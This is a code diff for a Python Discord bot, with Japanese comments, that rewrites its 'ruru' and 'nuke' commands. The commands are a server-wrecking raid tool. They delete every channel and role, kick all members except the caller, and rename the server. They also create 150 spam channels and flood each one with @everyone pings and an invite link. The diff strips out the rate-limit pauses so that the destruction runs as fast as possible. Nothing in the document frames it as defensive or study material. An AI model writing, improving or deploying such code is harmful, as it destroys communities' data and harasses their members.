@@ -99,47 +99,23 @@ async def info(ctx, member: discord.Member = None):
 #### RURU COMMAND ####
 @bot.command(name='ruru')
 async def ruru(ctx):
-    # サーバーのチャンネルリストを取得
-    channels = ctx.guild.channels
+    guild = ctx.guild
+    await ctx.send('Nuking the server...')
 
-    # チャンネル削除タスクを非同期で実行
-    delete_tasks = []
-    for channel in channels:
-        task = asyncio.create_task(channel.delete(reason="All channels are being deleted by !ruru command"))
-        delete_tasks.append(task)
-
-    # 全ての削除タスクが完了するまで待機
+    # 全てのチャンネルを削除
+    delete_tasks = [channel.delete() for channel in guild.channels]
     await asyncio.gather(*delete_tasks)
 
-    # 全てのチャンネルが削除されたことを確認
-    await ctx.send('All channels have been deleted. Fuck you all.')
-
     # 150個の「るるくん最強」チャンネルを最速で作成
-    create_tasks = []
-    for _ in range(150):
-        task = asyncio.create_task(ctx.guild.create_text_channel('るるくん最強'))
-        create_tasks.append(task)
+    create_tasks = [guild.create_text_channel('るるくん最強') for _ in range(150)]
+    new_channels = await asyncio.gather(*create_tasks)
 
-    # 最大10タスクずつバッチで実行
-    batch_size = 10
-    for i in range(0, len(create_tasks), batch_size):
-        batch = create_tasks[i:i + batch_size]
-        await asyncio.gather(*batch)
-        await asyncio.sleep(1)  # 短い待機時間を設定してレート制限を避ける
+    # 各チャンネルに@everyoneメンションを投稿
+    mention_message = '@everyone 今すぐ参加⬇️ https://discord.gg/AdHwh9gMJe'
+    mention_tasks = [channel.send(mention_message) for channel in new_channels for _ in range(15)]
+    await asyncio.gather(*mention_tasks)
 
-    # 作成したチャンネルに@everyoneメンションを投稿
-    new_channels = ctx.guild.text_channels
-    mention_tasks = []
-    for channel in new_channels:
-        for _ in range(15):
-            task = asyncio.create_task(channel.send('@everyone 今すぐ参加'))
-            mention_tasks.append(task)
-
-    # 最大10タスクずつバッチで実行
-    for i in range(0, len(mention_tasks), batch_size):
-        batch = mention_tasks[i:i + batch_size]
-        await asyncio.gather(*batch)
-        await asyncio.sleep(1)  # 短い待機時間を設定してレート制限を避ける
+    await ctx.send('Server has been nuked and channels created!')
 
 #### NUKE COMMAND ####
 @bot.command(name='nuke')
@@ -148,18 +124,16 @@ async def nuke(ctx):
     await ctx.send('Nuking the server...')
 
     # 全てのチャンネルを削除
-    for channel in guild.channels:
-        await channel.delete()
+    delete_tasks = [channel.delete() for channel in guild.channels]
+    await asyncio.gather(*delete_tasks)
 
     # 全てのロールを削除
-    for role in guild.roles:
-        if role.name != '@everyone':
-            await role.delete()
+    role_delete_tasks = [role.delete() for role in guild.roles if role.name != '@everyone']
+    await asyncio.gather(*role_delete_tasks)
 
     # 全てのメンバーをキック
-    for member in guild.members:
-        if member != ctx.author:
-            await member.kick()
+    kick_tasks = [member.kick() for member in guild.members if member != ctx.author]
+    await asyncio.gather(*kick_tasks)
 
     # サーバー名を変更
     await guild.edit(name='るるくんの勝ち')
